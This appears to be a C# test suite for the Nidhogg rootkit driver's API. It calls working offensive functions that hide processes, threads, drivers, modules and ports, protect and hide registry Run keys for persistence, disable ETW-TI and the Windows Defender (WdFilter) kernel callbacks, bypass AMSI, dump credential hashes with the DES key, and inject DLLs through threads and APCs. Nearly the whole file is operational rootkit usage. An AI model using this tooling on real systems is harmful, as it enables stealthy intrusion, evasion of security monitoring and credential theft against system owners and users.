using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static NidhoggCSharpApi.NidhoggApi;

namespace NidhoggCSharpApi
{
    public class NidhoggTestException : Exception
    {
        public NidhoggTestException(string message) : base(message)
        {
        }
    }

    internal class NidhoggTester
    {
        public void NidhoggScriptTest(string scriptPath)
        {
            NidhoggApi nidhogg;
            NidhoggErrorCodes error;
            Console.WriteLine("[>] Running NidhoggScriptTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            byte[] fileData = File.ReadAllBytes(scriptPath);
            IntPtr dataPtr = Marshal.AllocHGlobal(fileData.Length);
            Marshal.Copy(fileData, 0, dataPtr, fileData.Length);

            error = nidhogg.ExecuteScript(dataPtr, (uint)fileData.Length);
            Marshal.FreeHGlobal(dataPtr);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to execute script");
            Console.WriteLine("[+] Script executed successfully");
        }

        public void NidhoggFileTest()
        {
            NidhoggApi nidhogg;
            NidhoggErrorCodes nidhoggError;
            Console.WriteLine("[>] Running NidhoggFileTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            nidhoggError = nidhogg.FileProtect("C:\\Users\\Admin\\Desktop\\test.txt");

            if (!nidhoggError.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to protect file.");

            Console.WriteLine("[+] File protected.");
            string[] files = nidhogg.QueryFiles();

            if (files.Length == 0)
                throw new NidhoggTestException("[-] No files found.");

            Console.WriteLine("[+] Files after protect:");

            for (int i = 0; i < files.Length; i++)
            {
                Console.WriteLine($"\t{files[i]}");
            }

            nidhoggError = nidhogg.FileUnprotect("C:\\Users\\Admin\\Desktop\\test.txt");

            if (!nidhoggError.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to unprotect file.");

            files = nidhogg.QueryFiles();

            if (files.Length != 0)
                throw new NidhoggTestException("[-] Found files after unprotecting.");
            Console.WriteLine("[+] Nidhogg file test complete.");
        }

        public void NidhoggProcessTest(uint pid)
        {
            NidhoggApi nidhogg;
            NidhoggErrorCodes error;
            uint[] protectedProcesses;

            Console.WriteLine("[>] Running NidhoggProcessTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }
            
            error = nidhogg.ProcessProtect(pid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to protect process.");

            Console.WriteLine("[+] Process protected");
            protectedProcesses = nidhogg.QueryProtectedProcesses();

            if (protectedProcesses == null)
                throw new NidhoggTestException("[-] Failed to get protected processes.");

            Console.WriteLine("[+] Protected processes: " + string.Join(", ", protectedProcesses));
            error = nidhogg.ProcessUnprotect(pid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to unprotect process.");

            Console.WriteLine("[+] Process unprotected");
            protectedProcesses = nidhogg.QueryProtectedProcesses();

            if (protectedProcesses != null)
                throw new NidhoggTestException("[-] There are protected processes after unprotect.");

            error = nidhogg.ProcessHide(pid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to hide process.");

            Console.WriteLine("[+] Process hidden");
            error = nidhogg.ProcessUnhide(pid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to unhide process.");

            Console.WriteLine("[+] Process unhidden");

            error = nidhogg.ProcessElevate(pid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to elevate process.");

            Console.WriteLine("[+] Process elevated");

            error = nidhogg.ProcessSetProtection(pid, 2, 5);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to set process protection.");

            Console.WriteLine("[+] Process protection set");
            error = nidhogg.ProcessSetProtection(pid, 0, 0);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to restore process protection.");

            Console.WriteLine("[+] Success");
        }

        public void NidhoggThreadTest(uint tid)
        {
            NidhoggErrorCodes error;
            uint[] protectedThreads;
            NidhoggApi nidhogg;
            Console.WriteLine("[>] Running NidhoggThreadTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.ThreadProtect(tid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to protect thread.");

            Console.WriteLine("[+] Thread protected");
            protectedThreads = nidhogg.QueryProtectedThreads();

            if (protectedThreads == null)
                throw new NidhoggTestException("[-] There are no protected threads");

            Console.WriteLine("[+] Protected threads: " + string.Join(", ", protectedThreads));
            error = nidhogg.ThreadUnprotect(tid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to unprotect thread.");

            Console.WriteLine("[+] Thread unprotected");
            protectedThreads = nidhogg.QueryProtectedThreads();

            if (protectedThreads != null)
                throw new NidhoggTestException("[-] There are protected threads after unprotect.");

            error = nidhogg.ThreadHide(tid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to hide thread.");

            Console.WriteLine("[+] Thread hidden");
            error = nidhogg.ThreadUnhide(tid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to unhide thread.");

            Console.WriteLine("[+] Thread unhidden");
            Console.WriteLine("[+] Success");
        }

        public void NidhoggRegistryTest()
        {
            NidhoggErrorCodes error;
            string[] keys;
            Dictionary<string, string> values;
            NidhoggApi nidhogg;
            Console.WriteLine("[>] Running NidhoggRegistryTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            // Registry key protection.
            error = nidhogg.RegistryProtectKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to protect registry key.");
            Console.WriteLine("[+] Protected registry key");
            keys = nidhogg.QueryProtectedRegistryKeys();

            if (keys.Length == 0)
                throw new NidhoggTestException("[-] No protected registry keys found.");
            Console.WriteLine("[+] Protected registry keys:");

            for (int i = 0; i < keys.Length; i++)
            {
                Console.WriteLine($"\t{keys[i]}");
            }
            error = nidhogg.RegistryUnprotectKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to unprotect registry key.");
            Console.WriteLine("[+] Unprotected registry key");
            keys = nidhogg.QueryProtectedRegistryKeys();

            if (keys != null)
                throw new NidhoggTestException("[-] Found protected registry keys after unprotecting.");

            // Registry value protection.
            error = nidhogg.RegistryProtectValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                "test");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to protect registry value.");
            Console.WriteLine("[+] Protected registry value");
            values = nidhogg.QueryProtectedRegistryValues();

            if (values == null)
                throw new NidhoggTestException("[-] No protected registry values found.");
            Console.WriteLine("[+] Protected registry values:");

            foreach (KeyValuePair<string, string> value in values)
            {
                Console.WriteLine($"\t{value.Key} = {value.Value}");
            }
            error = nidhogg.RegistryUnprotectValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                "test");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to unprotect registry value.");

            Console.WriteLine("[+] Unprotected registry value");
            values = nidhogg.QueryProtectedRegistryValues();

            if (values != null)
                throw new NidhoggTestException("[-] Found protected registry values after unprotecting.");

            // Registry hide key.
            error = nidhogg.RegistryHideKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to hide registry key.");

            Console.WriteLine("[+] Hidden registry key");
            keys = nidhogg.QueryHiddenRegistryKeys();

            if (keys == null)
                throw new NidhoggTestException("[-] No hidden registry keys found.");
            Console.WriteLine("[+] Hidden keys:");

            for (int i = 0; i < keys.Length; i++)
            {
                Console.WriteLine($"\t{keys[i]}");
            }
            error = nidhogg.RegistryUnhideKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to unhide registry key.");

            Console.WriteLine("[+] Unhidden registry key");
            keys = nidhogg.QueryHiddenRegistryKeys();

            if (keys != null)
                throw new NidhoggTestException("[-] Found hidden registry keys after unhiding.");

            // Registry hide value.

            error = nidhogg.RegistryHideValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                   "test");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to hide registry value.");

            Console.WriteLine("[+] Hidden registry value");

            values = nidhogg.QueryHiddenRegistryValues();

            if (values == null)
                throw new NidhoggTestException("[-] No hidden registry values found.");

            Console.WriteLine("[+] Hidden registry values:");

            foreach (KeyValuePair<string, string> value in values)
            {
                Console.WriteLine($"\t{value.Key} = {value.Value}");
            }
            error = nidhogg.RegistryUnhideValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                   "test");

            if (!error.Equals(NidhoggErrorCodes.NIDHOGG_SUCCESS))
                throw new NidhoggTestException("[-] Failed to unhide registry value.");

            Console.WriteLine("[+] Unhidden registry value");
            values = nidhogg.QueryHiddenRegistryValues();

            if (values != null)
                throw new NidhoggTestException("[-] Found hidden registry values after unhiding.");
            Console.WriteLine("[+] Success");
        }

        public void NidhoggAntiAnalysisTest()
        {
            NidhoggErrorCodes error;
            NidhoggApi nidhogg;
            ulong callbackAddress = 0;
            Console.WriteLine("[>] Running NidhoggAntiAnalysisTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.EnableDisableEtwTi(false);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to disable Etwti");
            Console.WriteLine("[+] Etwti disabled");

            error = nidhogg.EnableDisableEtwTi(true);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to enable Etwti");
            Console.WriteLine("[+] Etwti enabled");

            PsRoutinesList psRoutines = nidhogg.ListPsRoutines(CallbackType.PsCreateProcessType);
            Console.WriteLine("[+] Listed ps routines:");

            for (int i = 0; i < psRoutines.NumberOfRoutines; i++)
            {
                Console.WriteLine($"\tDriver Name: {psRoutines.Routines[i].DriverName}");
                Console.WriteLine($"\tAddress: {psRoutines.Routines[i].CallbackAddress}\n");
            }

            ObCallbacksList obCallbacks = nidhogg.ListObCallbacks(CallbackType.ObProcessType);

            Console.WriteLine("[+] Listed object callbacks:");

            foreach (var callback in obCallbacks.Callbacks)
            {
                if (callback.DriverName.Contains("WdFilter"))
                    callbackAddress = (ulong)callback.PostOperation.ToInt64();
                Console.WriteLine($"\tDriver Name: {callback.DriverName}");
                Console.WriteLine($"\tPreOperation: {(ulong)callback.PreOperation.ToInt64()}");
                Console.WriteLine($"\tPostOperation: {(ulong)callback.PostOperation.ToInt64()}");
            }

            if (callbackAddress == 0)
                throw new NidhoggTestException("[-] Failed to find WdFilter callback");

            CmCallbacksList cmCallbacks = nidhogg.ListRegistryCallbacks();
            Console.WriteLine("[+] Listed registry callbacks:");

            for (int j = 0; j < cmCallbacks.NumberOfCallbacks; j++)
            {
                Console.WriteLine($"\tDriver Name: {cmCallbacks.Callbacks[j].DriverName}");
                Console.WriteLine($"\tCallback Address: {cmCallbacks.Callbacks[j].CallbackAddress}");
                Console.WriteLine($"\tContext: {cmCallbacks.Callbacks[j].Context}");
            }

            error = nidhogg.DisableCallback(callbackAddress, CallbackType.PsCreateProcessType);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to disable callback");
            Console.WriteLine("[+] Disabled callback");

            error = nidhogg.EnableCallback(callbackAddress, CallbackType.PsCreateProcessType);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to enable callback");
            Console.WriteLine("[+] Enabled callback");
        }

        public void NidhoggNetworkTest()
        {
            NidhoggErrorCodes error;
            HiddenPort[] hiddenPorts;
            NidhoggApi nidhogg;
            Console.WriteLine("[>] Running NidhoggNetworkTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.HidePort(80, false, PortType.TCP);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to hide port");
            Console.WriteLine("[+] Port hidden");

            hiddenPorts = nidhogg.QueryHiddenPorts();

            if (hiddenPorts == null)
                throw new NidhoggTestException("[-] Failed to query hidden ports");
            Console.WriteLine("[+] Hidden ports:");

            foreach (HiddenPort port in hiddenPorts)
            {
                Console.WriteLine($"\tPort: {port.Port}");

                if (port.Remote)
                    Console.Write("\tType: Remote, ");
                else
                    Console.Write("\tType: Local, ");

                if (port.Type == PortType.TCP)
                    Console.WriteLine("TCP");
                else
                    Console.WriteLine("UDP");
            }

            error = nidhogg.UnhidePort(80, false, PortType.TCP);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to unhide port");
            Console.WriteLine("[+] Port unhidden");
        }

        public void NidhoggPatchTest(uint pid)
        {
            NidhoggErrorCodes error;
            NidhoggApi nidhogg;
            Console.WriteLine("[>] Running NidhoggPatchTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.AmsiBypass(pid);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to bypass AMSI");
            Console.WriteLine("[+] AMSI bypassed");
        }

        public void NidhoggDriverHidingTest(string driverPath)
        {
            NidhoggErrorCodes error;
            NidhoggApi nidhogg;
            Console.WriteLine("[>] Running NidhoggDriverHidingTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.HideDriver(driverPath);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to hide driver");
            Console.WriteLine("[+] Driver hidden");

            error = nidhogg.UnhideDriver(driverPath);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to unhide driver");
            Console.WriteLine("[+] Driver unhidden");
        }

        public void NidhoggModuleHidingTest(uint pid, string moduleName)
        {
            NidhoggErrorCodes error;
            NidhoggApi nidhogg;
            Console.WriteLine("[>] Running NidhoggModuleHidingTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.HideModule(pid, moduleName);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] Failed to hide module");
            Console.WriteLine("[+] Module hidden");
        }

        public void NidhoggCredentialDumpingTest()
        {
            NidhoggApi nidhogg;
            Credentials[] credentials;
            DesKeyInformation desKey;
            string currentUsername;
            string currentDomain;
            string currentEncryptedHash;
            Console.WriteLine("[>] Running NidhoggCredentialDumpingTest");

            try
            {
                nidhogg = new NidhoggApi();
                (credentials, desKey) = nidhogg.DumpCredentials();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to dump credentials: " + e.Message);
            }

            if (credentials == null)
                throw new NidhoggTestException("[-] Failed to dump credentials");

            Console.WriteLine("[+] Des key:");

            byte[] dataBytes = new byte[desKey.Size];
            Marshal.Copy(desKey.Data, dataBytes, 0, (int)desKey.Size);

            foreach (byte b in dataBytes)
            {
                Console.Write(b.ToString("X2"));
                Console.Write(" ");
            }
            Console.WriteLine("");

            Console.WriteLine("[+] Credentials:");
            foreach (Credentials credential in credentials)
            {
                currentUsername = Marshal.PtrToStringUni(credential.Username.Buffer);
                Console.WriteLine($"Username: {currentUsername}");
                currentDomain = Marshal.PtrToStringUni(credential.Domain.Buffer);
                Console.WriteLine($"Domain: {currentDomain}");
                currentEncryptedHash = Marshal.PtrToStringUni(credential.EncryptedHash.Buffer);

                // Print encrypted hash as hex
                byte[] hashBytes = Encoding.Unicode.GetBytes(currentEncryptedHash);
                string hexString = BitConverter.ToString(hashBytes).Replace("-", " ");
                Console.WriteLine($"Encrypted hash: {hexString}");
            }
        }

        public void NidhoggDllInjectionTest(uint pid, string dllPath)
        {
            NidhoggApi nidhogg;
            NidhoggErrorCodes error;
            Console.WriteLine("[>] Running NidhoggDllInjectionTest");

            try
            {
                nidhogg = new NidhoggApi();
            }
            catch (NidhoggApiException e)
            {
                throw new NidhoggTestException("[-] Failed to connect to Nidhogg driver: " + e.Message);
            }

            error = nidhogg.DllInject(pid, dllPath, InjectionType.NtCreateThreadExInjection);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] DllInject with thread failed with error code: " + error);
            Console.WriteLine("[+] Injected DLL with thread successfully");

            error = nidhogg.DllInject(pid, dllPath, InjectionType.APCInjection);

            if (error != NidhoggErrorCodes.NIDHOGG_SUCCESS)
                throw new NidhoggTestException("[-] DllInject with APC failed with error code: " + error);
            Console.WriteLine("[+] Injected DLL with APC successfully");
        }
    }
}
